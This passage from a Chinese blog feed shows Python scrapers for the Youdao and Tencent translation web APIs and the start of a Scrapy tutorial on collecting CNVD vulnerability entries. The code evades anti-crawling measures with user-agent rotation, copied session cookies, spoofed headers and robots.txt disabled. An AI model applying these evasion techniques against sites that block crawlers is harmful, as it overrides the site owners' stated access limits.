QQBrowser&#x2F;7.0.3698.400)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident&#x2F;4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows NT 5.1) AppleWebKit&#x2F;537.1 (KHTML, like Gecko) Chrome&#x2F;21.0.1180.89 Safari&#x2F;537.1&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.1 (KHTML, like Gecko) Chrome&#x2F;21.0.1180.89 Safari&#x2F;537.1&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit&#x2F;533.17.9 (KHTML, like Gecko) Version&#x2F;5.0.2 Mobile&#x2F;8C148 Safari&#x2F;6533.18.5&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko&#x2F;20110307 Firefox&#x2F;4.0b13pre&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko&#x2F;20100101 Firefox&#x2F;16.0&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.11 (KHTML, like Gecko) Chrome&#x2F;23.0.1271.64 Safari&#x2F;537.11&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko&#x2F;20100922 Ubuntu&#x2F;10.10 (maverick) Firefox&#x2F;3.6.10&quot;</span><br><span class="line">        ]</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">            &quot;Accept&quot;: &quot;application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01&quot;,</span><br><span class="line">            &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">            &quot;Accept-Language&quot;: &quot;zh-CN,zh;q&#x3D;0.9&quot;,</span><br><span class="line">            &quot;Connection&quot;: &quot;keep-alive&quot;,</span><br><span class="line">            &quot;Content-Length&quot;: &quot;250&quot;,</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8&quot;,</span><br><span class="line">            &quot;Cookie&quot;: &quot;OUTFOX_SEARCH_USER_ID&#x3D;738693665@10.169.0.83; JSESSIONID&#x3D;aaatQLgZmROB1eQRqVG8w; OUTFOX_SEARCH_USER_ID_NCOO&#x3D;1687566578.4323611; ___rl__test__cookies&#x3D;1576803216496&quot;,</span><br><span class="line">            &quot;Host&quot;: &quot;fanyi.youdao.com&quot;,</span><br><span class="line">            &quot;Origin&quot;: &quot;http:&#x2F;&#x2F;fanyi.youdao.com&quot;,</span><br><span class="line">            &quot;Referer&quot;: &quot;http:&#x2F;&#x2F;fanyi.youdao.com&#x2F;&quot;,</span><br><span class="line">            &quot;User-Agent&quot;: random.choice(AGENTSLIST),</span><br><span class="line">            &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">            &quot;i&quot;: words,</span><br><span class="line">            &quot;from&quot;: &quot;AUTO&quot;,</span><br><span class="line">            &quot;to&quot;: &quot;AUTO&quot;,</span><br><span class="line">            &quot;smartresult&quot;: &quot;dict&quot;,</span><br><span class="line">            &quot;client&quot;: &quot;fanyideskweb&quot;,</span><br><span class="line">            &quot;salt&quot;: salt,</span><br><span class="line">            &quot;sign&quot;: sign,</span><br><span class="line">            &quot;ts&quot;: &quot;1578475676667&quot;,</span><br><span class="line">            &quot;bv&quot;: &quot;7aa7fb563107e590a52b125bb19c7b5a&quot;,</span><br><span class="line">            &quot;doctype&quot;: &quot;json&quot;,</span><br><span class="line">            &quot;version&quot;: &quot;2.1&quot;,</span><br><span class="line">            &quot;keyfrom&quot;: &quot;fanyi.web&quot;,</span><br><span class="line">            &quot;action&quot;: &quot;FY_BY_CLICKBUTTION&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    post_url &#x3D; &quot;http:&#x2F;&#x2F;fanyi.youdao.com&#x2F;translate?smartresult&#x3D;dict&amp;smartresult&#x3D;rule&quot;</span><br><span class="line">    time.sleep &#x3D; random.random()</span><br><span class="line">    r &#x3D; requests.post(post_url, data&#x3D;data, headers&#x3D;headers)</span><br><span class="line">    page &#x3D; str(r.content.decode())</span><br><span class="line">    # .text 是字符串编码</span><br><span class="line">    pattitle &#x3D; r&#39;&quot;tgt&quot;:&quot;(.*?)&quot;&#39;</span><br><span class="line">    title &#x3D; str(re.findall(pattitle, page, re.S)[0])</span><br><span class="line">    title &#x3D; title.replace(r&#39;\u201C&#39;, &#39;&quot;&#39;).replace(r&#39;\u201D&#39;, &#39;&quot;&#39;).replace(r&#39;\u2014&#39;, &#39;—&#39;).replace(r&#39;\u2022&#39;, &#39;•&#39;).replace (r&#39;\\ xe2 \\ x80 \\ x98&#39;,&#39;的&#39;).replace(r&#39;\\ xef \\ xbc \\ x88&#39;,&#39;（&#39;).replace(r&#39; \\ xef \\ xbc \\ x89&#39;,&#39;）&#39;)</span><br><span class="line">    print (title)</span><br><span class="line">    return title</span><br><span class="line"></span><br><span class="line">def para_trans(data):</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        multilist &#x3D; []</span><br><span class="line">        multipara &#x3D; &#39;&#39;</span><br><span class="line">        sentence &#x3D; list(data.split(&#39;.&#39;))</span><br><span class="line"></span><br><span class="line">        for item in sentence:</span><br><span class="line">            item &#x3D; str(item).replace(&#39;\n&#39;, &#39;&#39;)</span><br><span class="line">             # item &#x3D; unescape(item)</span><br><span class="line">            # print (item）</span><br><span class="line">            # item &#x3D; str(item).replace(&#39;\n&#39;,&#39;&#39;).replace(&#39; – &#39;,&#39;-&#39;).replace(&#39;&#x2F;&#39;,&#39;&#39;).replace(&#39;? &#39;,&#39; ?&#39;)</span><br><span class="line">            if item &#x3D;&#x3D; &#39;&#39;:</span><br><span class="line">                pass</span><br><span class="line">            else:</span><br><span class="line">                para &#x3D; senten_trans(item)</span><br><span class="line">                sign &#x3D; para[::-1][0]</span><br><span class="line">                if sign &#x3D;&#x3D; &#39;?&#39;:</span><br><span class="line">                    para &#x3D; para</span><br><span class="line">                else:</span><br><span class="line">                    para &#x3D; para + &#39;。&#39;</span><br><span class="line"></span><br><span class="line">                # para &#x3D; para +&#39;。&#39;</span><br><span class="line">                multilist.append(para)</span><br><span class="line"></span><br><span class="line">        multipara &#x3D; &#39;&#39;.join(str(multilist))</span><br><span class="line">        # print (multipara)</span><br><span class="line">        multipara &#x3D; str(multipara).replace(&#39;[&#39;, &#39;&#39;).replace(&#39;]&#39;, &#39;&#39;).replace(&quot;&#39;&quot;, &#39;&#39;).replace(&#39;,&#39;,&#39;&#39;)</span><br><span class="line">        # print(multipara)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">    return (multipara)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line"></span><br><span class="line">    # translate(&#39;&#39;)</span><br><span class="line">    para_trans(&#39;（Xiaomi） Cameras Connected to Google Nest Expose Video Feeds From Others.Have something to say about this article? Comment below or share it with us on Facebook, Twitter or our LinkedIn Group&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="谷歌翻译"><a href="#谷歌翻译" class="headerlink" title="谷歌翻译"></a>谷歌翻译</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_filter(text):</span><br><span class="line">    if isinstance(text, list):</span><br><span class="line">        text &#x3D; &#39;&#39;.join(text)</span><br><span class="line">    text &#x3D; str(text)</span><br><span class="line">    text &#x3D; text.strip()</span><br><span class="line">    filter_list &#x3D; [</span><br><span class="line">        &#39;\r&#39;, &#39;\n&#39;, &#39;\t&#39;, &#39;\u3000&#39;, &#39;\xa0&#39;, &#39;\u2002&#39;,</span><br><span class="line">        &#39;&lt;br&gt;&#39;, &#39;&lt;br&#x2F;&gt;&#39;, &#39;    &#39;, &#39;&#39;, &#39;&amp;nbsp;&#39;, &#39;&gt;&gt;&#39;, &#39;&quot;&#39;,</span><br><span class="line">        &#39;展开全部&#39;, &#39; &#39;</span><br><span class="line">    ]</span><br><span class="line">    for fl in filter_list:</span><br><span class="line">        text &#x3D; text.replace(fl, &#39;&#39;)</span><br><span class="line">    return text</span><br><span class="line"></span><br><span class="line">def get_qtv_qtk():</span><br><span class="line">    api_url &#x3D; &#39;https:&#x2F;&#x2F;fanyi.qq.com&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.36 (KHTML, &#39;</span><br><span class="line">                      &#39;like Gecko) Chrome&#x2F;73.0.3683.86 Safari&#x2F;537.36&#39;, &#125;</span><br><span class="line"></span><br><span class="line">    res &#x3D; requests.get(api_url, headers&#x3D;headers)</span><br><span class="line">    data &#x3D; res.text</span><br><span class="line">    fy_guid &#x3D; res.cookies.get(&#39;fy_guid&#39;)</span><br><span class="line">    reg &#x3D; re.compile(r&#39;var qtv &#x3D; &quot;(.*?)&quot;&#39;)</span><br><span class="line">    qtv &#x3D; reg.search(data).group(1)</span><br><span class="line">    reg &#x3D; re.compile(r&#39;var qtk &#x3D; &quot;(.*?)&quot;&#39;)</span><br><span class="line">    qtk &#x3D; reg.search(data).group(1)</span><br><span class="line"></span><br><span class="line">    return fy_guid, qtv, qtk</span><br><span class="line"></span><br><span class="line">def getHtml(url,headers,data):</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        html&#x3D; requests.post(url&#x3D;url,data&#x3D; data,headers&#x3D;headers)</span><br><span class="line">        #print(html.text)</span><br><span class="line">        datas &#x3D; html.json()[&#39;translate&#39;][&#39;records&#39;]</span><br><span class="line">        if html!&#x3D;None and datas !&#x3D; None :</span><br><span class="line">            # 以文本的形式打印结果</span><br><span class="line">            trans_result &#x3D; &#39;&#39;.join([data[&#39;targetText&#39;] for data in datas])</span><br><span class="line">        return trans_result</span><br><span class="line">    except Exception:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">class TencentTrans(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.api_url &#x3D; &#39;https:&#x2F;&#x2F;fanyi.qq.com&#x2F;api&#x2F;translate&#39;</span><br><span class="line">        self.headers &#x3D; &#123;</span><br><span class="line">            &#39;Cookie&#39;: &#39;fy_guid&#x3D;605ead81-f210-47eb-bd80-ac6ae5e7a2d8; &#39;</span><br><span class="line">                      &#39;qtv&#x3D;ed286a053ae88763; &#39;</span><br><span class="line">                      &#39;qtk&#x3D;wfMmjh3k&#x2F;7Sr2xVNg&#x2F;LtITgPRlnvGWBzP9a4FN0dn9PE7L5jDYiYJnW03MJLRUGHEFNCRhTfrp&#x2F;V+wUj0dun1KkKNUUmS86A&#x2F;wGVf6ydzhwboelTOs0hfHuF0ndtSoX+N3486tUMlm62VU4i856mqw&#x3D;&#x3D;; &#39;,</span><br><span class="line">            &#39;Host&#39;: &#39;fanyi.qq.com&#39;,</span><br><span class="line">            &#39;Origin&#39;: &#39;https:&#x2F;&#x2F;fanyi.qq.com&#39;,</span><br><span class="line">            &#39;Referer&#39;: &#39;https:&#x2F;&#x2F;fanyi.qq.com&#x2F;&#39;,</span><br><span class="line">            &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.36 (KHTML, &#39;</span><br><span class="line">                          &#39;like Gecko) Chrome&#x2F;73.0.3683.86 Safari&#x2F;537.36&#39;, &#125;</span><br><span class="line"></span><br><span class="line">        self.fromlang &#x3D; &#39;auto&#39;</span><br><span class="line">        self.text&#x3D;&#39;国家主席习近平致信祝贺中日高级别人文交流磋商机制首次会议在东京召开。习近平强调，当前，中日关系持续改善向好。希望中日双方共同利用好这一机制，推动人文交流，促进民心相通，为构建和发展契合新时代要求的中日关系提供人文支撑。&#39;</span><br><span class="line">        self.tolang &#x3D; &#39;en&#39;  # 设置默认为英语</span><br><span class="line">        self.sessionUuid &#x3D; str(int(time.time() * 1000))</span><br><span class="line"></span><br><span class="line">        self.fy_guid, self.qtv, self.qtk &#x3D; get_qtv_qtk()</span><br><span class="line"></span><br><span class="line">        self.headers[&#39;Cookie&#39;] &#x3D; self.headers[&#39;Cookie&#39;].replace(</span><br><span class="line">            &#39;605ead81-f210-47eb-bd80-ac6ae5e7a2d8&#39;, self.fy_guid)</span><br><span class="line"></span><br><span class="line">        self.headers[&#39;Cookie&#39;] &#x3D; self.headers[&#39;Cookie&#39;].replace(</span><br><span class="line">            &#39;ed286a053ae88763&#39;, self.qtv)</span><br><span class="line">        self.headers[&#39;Cookie&#39;] &#x3D; self.headers[&#39;Cookie&#39;].replace(</span><br><span class="line">            &#39;wfMmjh3k&#x2F;7Sr2xVNg&#x2F;LtITgPRlnvGWBzP9a4FN0dn9PE7L5jDYiYJnW03MJLRUGHEFNCRhTfrp&#x2F;V+wUj0dun1KkKNUUmS86A&#x2F;wGVf6ydzhwboelTOs0hfHuF0ndtSoX+N3486tUMlm62VU4i856mqw&#x3D;&#x3D;&#39;,</span><br><span class="line">            self.qtk)</span><br><span class="line"></span><br><span class="line">    def get_trans_result(self,text):</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &#39;source&#39;: self.fromlang,</span><br><span class="line">            &#39;target&#39;: self.tolang,</span><br><span class="line">            &#39;sourceText&#39;: text,</span><br><span class="line">            &#39;qtv&#39;: self.qtv,</span><br><span class="line">            &#39;qtk&#39;: self.qtk,</span><br><span class="line">            &#39;sessionUuid&#39;: self.sessionUuid, &#125;</span><br><span class="line"></span><br><span class="line">        trans_result &#x3D; getHtml(self.api_url,self.headers,data)</span><br><span class="line">        return trans_result</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    Tencent &#x3D; TencentTrans()</span><br><span class="line">    text &#x3D; &#39;&#39;&#39;You are here: Home &#x2F; Deep Web Links &#x2F; Deep Web Links and Websites – 1000 Active Top dark web sites</span><br><span class="line">Deep Web Links and Websites – 1000 Active Top dark web sites</span><br><span class="line"></span><br><span class="line">June 25, 2018 by Admin 24 Comments</span><br><span class="line"></span><br><span class="line">Deep web links covers – Tor websites, Deep web site, Dark net websites, dark web sites list, dark web websites, onion websites, hidden websites, tor websites list, etc., We have given a bunch of deep web links below, but before accessing those links know what is deep web and safety tips to access the deep web.</span><br><span class="line"></span><br><span class="line">The deep web is the hidden part of the internet. The deep web links are not indexed by the popular search engines like Google, Yahoo and Bing, etc., The links that are hidden from the internet are known as a deep web or deep web links. The deep web links have a special extension “.Onion” and also known as “Onion links”.</span><br><span class="line"></span><br><span class="line">Only 5% of the web is available on the surface web, the remaining 95% is hidden on the surface web. There are many scam sites or fraudulent sites are available on the internet. So be careful before using any of those links. Use the Tor browser to surf the deep web. Keep your anonymity safe in the deep web. Use the Tor browser along with a premium VPN to maintain your anonymity.</span><br><span class="line"></span><br><span class="line">Contents show</span><br><span class="line">HOW TO ACCESS THE DEEP WEB</span><br><span class="line"></span><br><span class="line">Before accessing the deep web you should know what is deep web and how to access the deep web safely.</span><br><span class="line"></span><br><span class="line">As you know that you cannot access the deep web in normal search engines and browsers, you need a special browser known as TOR browser to access the deep web.</span><br><span class="line"></span><br><span class="line">Do you know that Dark net is not only the place where you can purchase drugs, weapons or money counterfeits but also the place you can earn money? If you want to know more, take a look at this little Mr.Green’s Guide</span><br><span class="line">Why do we recommend you to use the TOR browser?</span><br><span class="line"></span><br><span class="line">It is because that Tor browser is specially made to access the .onion links. The main reason is that it maintains your anonymity. When you use TOR browser it hides your IP. Let me explain how the Tor works. If a user sends data the data is encrypted first. Then the encrypted data is sent to different layers of computers and it reaches the destination. This is structured like an onion. This is done because no one can find the user and trace them back. This process makes the user stay anonymous on the internet.</span><br><span class="line"></span><br><span class="line">Some tips to stay anonymous on the internet.</span><br><span class="line"></span><br><span class="line">        Always use the Tor web browser to browse the .onion links.</span><br><span class="line"></span><br><span class="line">        Never trust anyone on the deep web</span><br><span class="line"></span><br><span class="line">    Always use TOR along with a paid VPN because it ensures more anonymous.</span><br><span class="line">    Use different identity change your name and always use that name in deep web &#39;&#39;&#39;</span><br><span class="line">    print(Tencent.get_trans_result(text))</span><br></pre></td></tr></table></figure><p>可参考：</p><p><a href="https://github.com/neverneverendup/Translator">https://github.com/neverneverendup/Translator</a></p><p>集合了互联网在线翻译引擎爬虫，包含谷歌翻译、百度翻译、有道翻译、必应翻译、小牛翻译、腾讯翻译君等引擎。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapy爬虫入门（二） 反爬机制如何处理</title>
      <link href="2020/03/31/2020-03-31-scrapy_spiders_2_deal_with_anti-crawl/"/>
      <url>2020/03/31/2020-03-31-scrapy_spiders_2_deal_with_anti-crawl/</url>
      
        <content type="html"><![CDATA[<h2 id="Scrapy爬虫入门（二）-反爬机制如何处理"><a href="#Scrapy爬虫入门（二）-反爬机制如何处理" class="headerlink" title="Scrapy爬虫入门（二） 反爬机制如何处理"></a>Scrapy爬虫入门（二） 反爬机制如何处理</h2><p>之前对CNVD的安全资讯进行了采集，同理我们对CNNVD、安全牛的新闻也进行了采集，未来计划将安全资讯的网站都添加进来。尝试进行漏洞的采集，漏洞采集过程中发现CNVD的漏洞采集存在反爬机制，如果不进行一些设置，将会在一段时间内封禁你的IP，故了解Scrapy如何设置反爬，记录如下。</p><p>对于CNVD漏洞采集的爬虫</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> VulninfoSpidersItem</span><br><span class="line"><span class="keyword">from</span> w3lib.html <span class="keyword">import</span> remove_tags</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> ..convert_date <span class="keyword">import</span> convert_date_1</span><br><span class="line"><span class="keyword">from</span> ..convert_format <span class="keyword">import</span> replace_wrap</span><br><span class="line"><span class="keyword">from</span> ..duplicate <span class="keyword">import</span> urlhash,judgehash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 国家信息安全漏洞共享平台</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNVD_Spider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&quot;CNVD&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始爬取列表</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.cnvd.org.cn/flaw/list.htm?flag=true&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    headers_list = &#123;</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;https://www.cnvd.org.cn/flaw/list.htm&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;www.cnvd.org.cn&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User_Agents&#x27;</span>:<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;https://www.cnvd.org.cn&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    headers_content = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.cnvd.org.cn/flaw/list.htm?flag=true&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.cnvd.org.cn&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User_Agents&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://www.cnvd.org.cn&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_requests</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">60</span>, <span class="number">20</span>):</span><br><span class="line">            self.start_urls.append(<span class="string">&#x27;https://www.cnvd.org.cn/flaw/list.htm?max=20&amp;offset=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> self.start_urls:</span><br><span class="line">                <span class="keyword">yield</span> scrapy.Request(url=url, callback=self.parse,headers=self.headers_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对于单个爬虫，自定义设置</span></span><br><span class="line">    custom_settings = &#123;</span><br><span class="line">        <span class="string">&#x27;DOWNLOAD_DELAY&#x27;</span> : <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ROBOTSTXT_OBEY&#x27;</span> : <span class="string">&#x27;False&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONCURRENT_REQUESTS_PER_DOMAIN&#x27;</span>:<span class="string">&#x27;5&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实现漏洞列表页面的解析函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">        links = response.css(<span class="string">&#x27;tbody&gt;tr a::attr(href)&#x27;</span>).extract()</span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">            link = <span class="string">&#x27;https://www.cnvd.org.cn&#x27;</span>+link</span><br><span class="line">            <span class="comment"># print(link)</span></span><br><span class="line">            <span class="keyword">if</span> judgehash(urlhash(link)) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">yield</span> scrapy.Request(link,callback=self.parse_vuln,headers=self.headers_content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实现漏洞信息页面的解析函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_vuln</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        vuln= VulninfoSpidersItem()</span><br><span class="line">        vuln[<span class="string">&#x27;hash&#x27;</span>] = urlhash(response.url)</span><br><span class="line">        vuln[<span class="string">&#x27;name&#x27;</span>] = response.xpath(<span class="string">&#x27;/html/body/div[4]/div[1]/div[1]/div[1]/h1/text()&#x27;</span>).extract_first().strip(<span class="string">&#x27;\n\t &#x27;</span>)</span><br><span class="line">        vuln[<span class="string">&#x27;url&#x27;</span>] = response.url</span><br><span class="line">        table = re.search(<span class="string">&#x27;&lt;div class=&quot;blkContainerPblk&quot;&gt;(.*?)&lt;div class=&quot;content_line&quot;&gt;&#x27;</span>, response.text, re.S).group()</span><br><span class="line">        cve = re.search(<span class="string">&#x27;CVE-\d+-\d+&#x27;</span>, table)</span><br><span class="line">        vuln[<span class="string">&#x27;cve&#x27;</span>] = cve.group() <span class="keyword">if</span> cve != <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span 